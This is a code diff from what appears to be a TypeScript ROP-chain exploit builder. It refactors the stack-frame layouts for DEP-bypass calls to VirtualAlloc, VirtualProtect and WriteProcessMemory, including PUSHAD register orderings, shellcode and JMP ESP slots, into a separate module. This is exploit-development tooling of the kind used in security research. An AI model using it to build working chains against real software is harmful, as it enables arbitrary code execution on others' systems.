@@ -3,76 +3,9 @@ import { rankCandidates } from "../rop/emitter";
 import { RopGadget } from "../rop/types";
 import { buildRopIndexFromRpPlusText } from "../rop";
 import { MAX_HOPS, Path, ReachIndex, Reg, Unreached, Val, constVal, describe, effectOf, isPath } from "../rop/reach";
+import { FRAMES, FrameFacts, frameGoal, PUSHAD_FRAMES, PUSHAD_TAIL, Slot } from "./dep_frames";
 import { DepPlanStyle, JobPlan, LARGE_STACK_MOVE, Verdict, gadgetAddress, hex32, holds, memoryWrites, movesEsp, sequence, sideEffects, stackMove, writtenRegisters } from "./dep_plan";
 import { DepApi } from "./rop_template";
-
-// Where each argument of the call comes from. One list of slots per API serves both styles: the skeleton
-// writes each slot into a dword of the buffer, PUSHAD pushes each slot from the register it names.
-type Source =
-  | { kind: "api" }
-  | { kind: "shellcode" }
-  | { kind: "size" }
-  | { kind: "const"; value: number }
-  | { kind: "named"; name: "WRITABLE" | "CAVE" }
-  | { kind: "ropnop" }
-  | { kind: "jmpesp" }
-  | { kind: "skip3" }
-  | { kind: "nops" };
-
-type Slot = { name: string; source: Source; register?: string };
-
-const API: Source = { kind: "api" };
-const SHELLCODE: Source = { kind: "shellcode" };
-const WRITABLE: Source = { kind: "named", name: "WRITABLE" };
-const CAVE: Source = { kind: "named", name: "CAVE" };
-const c = (value: number): Source => ({ kind: "const", value });
-
-const FRAMES: Record<DepApi, Slot[]> = {
-  VirtualAlloc: [
-    { name: "VirtualAlloc", source: API }, { name: "return", source: SHELLCODE }, { name: "lpAddress", source: SHELLCODE },
-    { name: "dwSize", source: { kind: "size" } }, { name: "flAllocationType", source: c(0x1000) }, { name: "flProtect", source: c(0x40) },
-  ],
-  VirtualProtect: [
-    { name: "VirtualProtect", source: API }, { name: "return", source: SHELLCODE }, { name: "lpAddress", source: SHELLCODE },
-    { name: "dwSize", source: c(0x201) }, { name: "flNewProtect", source: c(0x40) }, { name: "lpflOldProtect", source: WRITABLE },
-  ],
-  WriteProcessMemory: [
-    { name: "WriteProcessMemory", source: API }, { name: "return", source: CAVE }, { name: "hProcess", source: c(0xffffffff) },
-    { name: "lpBaseAddress", source: CAVE }, { name: "lpBuffer", source: SHELLCODE }, { name: "nSize", source: c(0x210) },
-    { name: "lpNumberOfBytesWritten", source: WRITABLE },
-  ],
-};
-
-// PUSHAD pushes EAX, ECX, EDX, EBX, the old ESP, EBP, ESI, EDI, so from ESP up the frame reads EDI first.
-// For VirtualAlloc and VirtualProtect the old ESP lands on lpAddress, the first argument, and a stack address
-// is what that argument wants. For WriteProcessMemory it would land on an argument that must be the cave, so
-// EDI carries a gadget that skips the old ESP and the two registers around it and execution resumes at EBX.
-// Slots are listed in the order the [4/7] pop jobs load them.
-const PUSHAD_FRAMES: Record<DepApi, Slot[]> = {
-  VirtualAlloc: [
-    { name: "VirtualAlloc", source: API, register: "esi" }, { name: "return", source: { kind: "jmpesp" }, register: "ebp" },
-    { name: "dwSize", source: c(0x1), register: "ebx" }, { name: "flAllocationType", source: c(0x1000), register: "edx" },
-    { name: "flProtect", source: c(0x40), register: "ecx" }, { name: "ropnop", source: { kind: "ropnop" }, register: "edi" },
-    { name: "nops", source: { kind: "nops" }, register: "eax" },
-  ],
-  VirtualProtect: [
-    { name: "VirtualProtect", source: API, register: "esi" }, { name: "return", source: { kind: "jmpesp" }, register: "ebp" },
-    { name: "dwSize", source: c(0x201), register: "ebx" }, { name: "flNewProtect", source: c(0x40), register: "edx" },
-    { name: "lpflOldProtect", source: WRITABLE, register: "ecx" }, { name: "ropnop", source: { kind: "ropnop" }, register: "edi" },
-    { name: "nops", source: { kind: "nops" }, register: "eax" },
-  ],
-  WriteProcessMemory: [
-    { name: "WriteProcessMemory", source: API, register: "ebx" }, { name: "return", source: CAVE, register: "edx" },
-    { name: "hProcess", source: c(0xffffffff), register: "ecx" }, { name: "skip3", source: { kind: "skip3" }, register: "edi" },
-    { name: "lpBaseAddress", source: CAVE, register: "eax" },
-  ],
-};
-
-const PUSHAD_TAIL: Record<DepApi, Slot[]> = {
-  VirtualAlloc: [],
-  VirtualProtect: [],
-  WriteProcessMemory: [{ name: "lpBuffer", source: SHELLCODE }, { name: "nSize", source: c(0x210) }, { name: "lpNumberOfBytesWritten", source: WRITABLE }],
-};
 
 // One row per gadget the chain uses. Every block is a rendering of this table.
 export type Entry = { name: string; address: number; sequence: string; pops: number; retn: number; job: string; loads: number };
@@ -557,21 +490,17 @@ export function buildExploit(input: BuildInput): Build {
   const skipper = (): RopGadget | undefined => rankCandidates(gadgets.filter((gadget) => !movesEsp(gadget) && extraPops(gadget, 0) === 3 && lastRetN(gadget) === 0 && memoryWrites(gadget, "").length === 0))[0];
   // What the search must leave in the register for a slot, without adding anything to the table: the
   // pushad order is tried with this before a single loader is written.
+  // The three slots whose value is an address in the corpus rather than a fact about the target. Every
+  // other slot's goal comes from `frameGoal`, the same function the method layer weighs a write gadget
+  // with, so the value a loader searches for and the value the choice of register was made against
+  // cannot differ.
+  const facts: FrameFacts = { iatSlot: input.iatSlot, delta: input.delta?.value, writable: input.writable, cave: input.cave };
   const goalOf = (slot: Slot): Val | undefined => {
-    const source = slot.source;
-    switch (source.kind) {
-      case "api": return input.iatSlot === undefined ? undefined
-        : { mem: { at: input.iatSlot, text: "IAT_SLOT" }, k: input.delta?.value ?? 0, text: input.delta ? "API_DELTA" : "0" };
-      case "const": return constVal(source.value);
-      case "named": {
-        const value = source.name === "WRITABLE" ? input.writable : input.cave;
-        return value === undefined ? undefined : constVal(value, source.name);
-      }
-      case "nops": return constVal(0x90909090);
+    switch (slot.source.kind) {
       case "ropnop": { const ret = lone(); return ret ? constVal(gadgetAddress(ret), "RET") : undefined; }
       case "jmpesp": return input.jmpEsp === undefined ? undefined : constVal(input.jmpEsp, "JMP_ESP");
       case "skip3": { const skip = skipper(); return skip ? constVal(gadgetAddress(skip), "SKIP3") : undefined; }
-      default: return undefined;
+      default: return frameGoal(slot, facts);
     }
   };
 
